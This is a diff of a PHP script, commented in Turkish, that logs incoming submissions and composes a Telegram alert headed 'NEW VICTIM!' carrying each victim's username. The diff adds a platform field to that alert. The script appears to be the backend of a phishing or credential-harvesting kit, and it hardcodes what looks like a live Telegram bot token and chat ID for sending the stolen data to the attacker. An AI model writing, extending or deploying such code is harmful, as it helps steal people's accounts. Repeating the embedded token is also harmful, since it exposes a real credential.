@@ -1,9 +1,9 @@
 <?php
 // ============================================
-// TELEGRAM BOT AYARLARI - BURAYI DOLDURUN!
+// TELEGRAM BOT AYARLARI
 // ============================================
-define('TELEGRAM_BOT_TOKEN', '8522279955:AAFwA7uILD8zkzrxcjXjazc5guzSm1cFI5k'); // @BotFather'dan al
-define('TELEGRAM_CHAT_ID', '6063727392');    // @userinfobot'dan al
+define('TELEGRAM_BOT_TOKEN', '8522279955:AAFwA7uILD8zkzrxcjXjazc5guzSm1cFI5k');
+define('TELEGRAM_CHAT_ID', '6063727392');
 // ============================================
 
 header('Content-Type: application/json');
@@ -53,6 +53,10 @@ file_put_contents($log_file, json_encode($existing_data, JSON_PRETTY_PRINT | JSO
 // ============================================
 if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
     $message = "🚨 <b>YENİ KURBAN!</b>\n\n";
+    
+    if (isset($data['platform'])) {
+        $message .= "📱 <b>Platform:</b> " . htmlspecialchars($data['platform']) . "\n";
+    }
     
     if (isset($data['username'])) {
         $message .= "👤 <b>Kullanıcı:</b> @" . htmlspecialchars($data['username']) . "\n";
